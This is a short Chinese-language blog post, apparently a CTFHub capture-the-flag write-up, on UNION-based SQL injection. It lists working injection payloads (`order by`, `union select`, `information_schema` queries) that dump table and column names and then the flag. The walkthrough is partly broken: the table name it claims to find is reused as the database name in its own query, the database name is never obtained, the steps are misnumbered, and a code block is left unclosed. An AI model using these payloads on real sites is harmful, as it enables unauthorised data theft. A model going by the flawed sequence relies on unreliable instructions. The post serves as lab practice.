---
title: CTFHub SQL注入 - UNION联合注入
date: 2026-11-13
tags: [CTFHub, Web, SQL注入, Union注入]
excerpt: 记录通过完整的 UNION 联合查询注入，逐步探测字段数、回显位，并最终爆出库名、表名获取 flag 的过程。
---

思路：题目提示为常规的 SQL 注入，根据回显情况判断为 UNION 联合查询注入。解题核心是**先判断字段数，确定回显位，然后利用 information_schema 逐步获取数据库名、表名、列名，最终查出 flag**。

问题：
1. 直接输入常规的测试语句（如 `and 1=1`），页面回显无明显变化，需寻找注入点。
2. 猜测字段数时，如果直接猜较大的数字，会导致页面报错或回显异常，需要使用 `order by` 进行二分法或递增测试。
3. 在利用 `information_schema` 获取表名和列名时，需注意 `table_schema` 和 `table_name` 的条件限制，否则会输出大量无用信息导致页面无法正常渲染。

解决：
1. 确定目标 URL 的注入点，使用 `order by` 判断当前查询的字段数。经测试，字段数为 2。
   ```bash
   ?id=1' order by 2 --+
2.确定回显位。将 id 改为负数使其报错，或使用 and 1=2，查看回显位置。发现回显位在 1 和 2 的位置。
   ?id=-1' union select 1,2 --+
爆出当前数据库中的表名。查询 information_schema.tables，得出表名为：cepjvrnqkd
     ?id=-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='cepjvrnqkd' --+
4.爆出指定表（cepjvrnqkd）中的列名
    ?id=-1' union select 1,group_concat(column_name) from information_schema.columns where table_schema='cepjvrnqkd' and table_name='cepjvrnqkd' --+
5.得到flag
   ?id=-1' union select 1,sqkfujosxf from cepjvrnqkd --+
